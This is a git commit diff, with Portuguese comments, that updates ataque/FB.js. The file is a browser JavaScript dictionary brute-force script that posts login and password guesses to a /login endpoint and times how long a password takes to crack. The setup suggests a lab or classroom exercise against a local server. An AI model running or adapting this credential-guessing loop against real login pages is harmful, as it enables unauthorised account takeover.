fe850ff3265ec5f4f498ce7725bd59465c72a0d6
Felipe Schmidt <schmidtfe2@gmail.com>
2021-08-28 13:30:22 -0300

    Atualização arquivos de Ataque e criação arquivo com dicionario

--- ataque/FB.js
+++ ataque/FB.js
@@ -1,18 +1,25 @@
+adicionarSenha(0,'admin');  //Inicio
+// adicionarSenha(1,'admin');  //Meio
+// adicionarSenha(2,'admin');  //Fim
+
 const dicionario = {
-    logins: ['adm', 'administrador', 'admin',],
-    senhas: ['adm', '123', '1234', '12345', 'administrador', 'admin']
+    logins: ['admin'],
+    senhas: senhas
 };
 
 let data = {};
-let find = {};
+let times = {
+    start: Date.now(),
+    end: 0
+}
 
 const url =  window.location.origin || 'http://localhost:4343';
 const urlAlvo = `${url}/login`;
 
 let login = 0, pwd = 0;
 let count = 0;
-a();
-function a() {
+sendAjax();
+function sendAjax() {
     count++;
     data.login = dicionario.logins[login];
     data.senha = dicionario.senhas[pwd];
@@ -25,28 +32,30 @@ function a() {
         contentType: "application/json; charset=utf-8",
         statusCode: {
             200: () => {
-                bad = false;
-                find.login = dicionario.logins[login];
-                find.senha = dicionario.senhas[pwd];
-                b();
+                let user = {};
+                user.login = dicionario.logins[login];
+                user.senha = dicionario.senhas[pwd];
+                endFB({user});
             },
             401: () => {
-                if (login++ > dicionario.logins.length) {
-                    login = 0;
-                    if (pwd++ > dicionario.senhas.length) {
-                        pwd = 0;
-                    }
-                }
-                if (login >= dicionario.logins.length && pwd >= dicionario.senhas.length) {
-                    b();
+                if (login+1 >= dicionario.logins.length && pwd+1 >= dicionario.senhas.length) {
+                    endFB({user:"Não encontrado"});
                 } else {
-                    a();
+                    if (++login >= dicionario.logins.length) {
+                        login = 0;
+                        if (++pwd >= dicionario.senhas.length) {
+                            pwd = 0;
+                        }
+                    }
+                    sendAjax();
                 }
             }
         }
     });
 }
 
-function b() {
-    console.log({ loginEncontrado: find });
+function endFB(user) {
+    console.log({ loginEncontrado: user });
+    times.end = Date.now();
+    console.log('Milissegundos para quebrar a senha:',times.end-times.start);
 }
